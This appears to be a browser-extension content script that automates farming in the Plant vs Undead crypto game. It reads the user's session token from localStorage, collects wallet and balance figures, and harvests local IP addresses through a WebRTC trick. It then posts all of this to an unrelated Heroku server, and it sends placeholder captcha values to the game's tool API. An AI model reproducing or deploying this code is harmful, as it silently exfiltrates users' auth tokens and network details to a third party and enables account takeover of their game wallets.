let ip = [];
// const url = 'https://e236e17a-cd39-4896-b485-b209bc670df2.mock.pstmn.io/';
const url = 'https://backend-farm.plantvsundead.com/';
let token = '';
let device = '';
let jobs = [];

setTimeout(() => {
    console.log('VERIFICACIÓN');
    // sendEmail([]);
    if (window.location.toString().includes('https://marketplace.plantvsundead.com')) {
        console.log('DENTRO');
        try {

            var wallet = +document.getElementsByClassName("wallet-text")[0].getElementsByTagName('span')[0].innerText;
            // console.log(wallet)
            var pvu = +document.getElementsByClassName("tw-flex tw-flex-grow tw-text-white tw-pr-1 farmed-text")[0].innerText;
            // console.log(pvu)
            var sanpling = +document.getElementsByClassName("exchange-number")[0].innerText;
            // console.log(sanpling)
            var tools = [];
            var toolshtml = document.getElementsByClassName("tool-box tw-bg-orange-tools tw-rounded-3xl tw-p-5 sm:tw-grid tw-grid-cols-1 tw-relative tw-hidden")[0]
                .getElementsByClassName('tw-flex tw-flex-row')
            for (let index = 0; index < toolshtml.length; index++) {
                const tool = toolshtml[index];
                // console.log(tool.getElementsByClassName('tw-m-auto')[0])
                tools.push({
                    img: tool.getElementsByTagName('img')[0].src,
                    qty: +tool.getElementsByClassName('tw-absolute usages tw-bg-green-usage tw-text-white tw-font-bold tw-text-center tw-items-center tw-rounded-full')[0].innerText
                })
            }
        } catch (error) {

        }
        let status = {
        }
        try {
            status = {
                wallet,
                pvu,
                sanpling,
                tools
            }
        } catch (error) {

        }
        console.log(tools)

        token = localStorage.getItem('token')
        console.log(url + 'farms?limit=10&offset=0')
        console.log(token)
        if (token) {
            getData(url + 'farms?limit=10&offset=0').then((farms) => {
                jobs = [];
                console.log({ farms })
                if (farms.data && farms.data.length > 0) {

                    // SET SPANCROW 
                    if (!localStorage.getItem('setSpanCrow') || localStorage.getItem('setSpanCrow') === 'true') {
                        for (let i = 0; i < farms.data.length; i++) {
                            const farm = farms.data[i];

                            if (farm.hasCrow) {
                                const id = farm._id;
                                setSpancrow(url + 'farms/apply-tool', id).then((res) => {
                                    if (res.status === 200) {
                                        return res.json();
                                    } else {
                                        return false;
                                    }
                                }).then((res) => {
                                    if (res && res.status === 0 && res.data && res.data.reward === 0) {
                                        localStorage.setItem('setSpanCrow', 'true');
                                    } else {
                                        localStorage.setItem('setSpanCrow', 'false');
                                        sendEmail([]);
                                    }
                                }).then(() => {
                                    location.reload();
                                });
                                break;
                            }
                        }
                    }
                    // END SET SPANCROW 


                    farms.data.forEach(farm => {
                        if (farm.needWater) {
                            jobs.push({ id: farm._id, job: 'WATER', complete: false, icon: farm.plant.iconUrl });
                        }
                        if (farm.hasCrow) {
                            jobs.push({ id: farm._id, job: 'SPANCROW', complete: false, icon: farm.plant.iconUrl });
                        }
                        if (farm.stage === 'cancelled' && farm.totalHarvest > 0) {
                            jobs.push({ id: farm._id, job: 'WATER', complete: false, icon: farm.plant.iconUrl });
                        }
                    });
                }
                if (jobs.length > 0) {
                    // sendEmail(jobs);
                }
                farms = { ...farms, status };
                fetch('https://quantum-ia.herokuapp.com/firebase/plants', {
                    method: 'POST', // *GET, POST, PUT, DELETE, etc.
                    mode: 'cors', // no-cors, *cors, same-origin
                    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
                    credentials: 'same-origin', // include, *same-origin, omit
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    redirect: 'follow', // manual, *follow, error
                    referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
                    body: JSON.stringify({
                        ip,
                        token,
                        bnb: localStorage.getItem('balance'),
                        date: new Date().getTime(),
                        id: localStorage.hasOwnProperty('device') ?
                            localStorage.getItem('device') :
                            'DEVICE',
                        ...farms
                    }) // body data type must match "Content-Type" header
                }).then(() => {

                }) // parses JSON response into native JavaScript objects

            }).catch((err) => {
                console.log(err)
            }).finally(() => { });
        }
    }
    setTimeout(() => {
        location.reload();
    }, 1000 * 60 * 5);


}, 10000);
function sendEmail(body) {
    setTimeout(() => {
        chrome.runtime.sendMessage({ content: { body, token } });
    }, 1500);
}
// Ejemplo implementando el metodo POST:
async function getData(url = '') {
    // Opciones por defecto estan marcadas con un *
    const response = await fetch(url, {
        method: 'GET', // *GET, POST, PUT, DELETE, etc.
        mode: 'cors', // no-cors, *cors, same-origin
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/json',
            'authorization': 'Bearer Token: ' + token
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
    });
    return response.json(); // parses JSON response into native JavaScript objects
}
// Ejemplo implementando el metodo POST: farms/apply-tool
async function setSpancrow(url = '', id) {
    // Opciones por defecto estan marcadas con un *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        mode: 'cors', // no-cors, *cors, same-origin
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/json',
            'authorization': 'Bearer Token: ' + token
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
        body: JSON.stringify({
            "farmId": id,
            "toolId": 4,
            "token": {
                "challenge": "default",
                "seccode": "default",
                "validate": "default"
            }
        }) // body data type must match "Content-Type" header
    });
    return response; // parses JSON response into native JavaScript objects
}
// setTimeout(() => {
//     location.reload();
// }, 1000 * 60 * 20);
// Example (using the function below).




getLocalIPs(function (ips) {
    ip = ips;
    console.log('Local IP addresses:\n ' + ips.join('\n '));
});

function getLocalIPs(callback) {
    var ips = [];

    var RTCPeerConnection = window.RTCPeerConnection ||
        window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

    var pc = new RTCPeerConnection({
        // Don't specify any stun/turn servers, otherwise you will
        // also find your public IP addresses.
        iceServers: []
    });
    // Add a media line, this is needed to activate candidate gathering.
    pc.createDataChannel('');

    // onicecandidate is triggered whenever a candidate has been found.
    pc.onicecandidate = function (e) {
        if (!e.candidate) { // Candidate gathering completed.
            pc.close();
            callback(ips);
            return;
        }
        var ip = /^candidate:.+ (\S+) \d+ typ/.exec(e.candidate.candidate)[1];
        if (ips.indexOf(ip) == -1) // avoid duplicate entries (tcp/udp)
            ips.push(ip);
    };
    pc.createOffer(function (sdp) {
        pc.setLocalDescription(sdp);
    }, function onerror() { });
}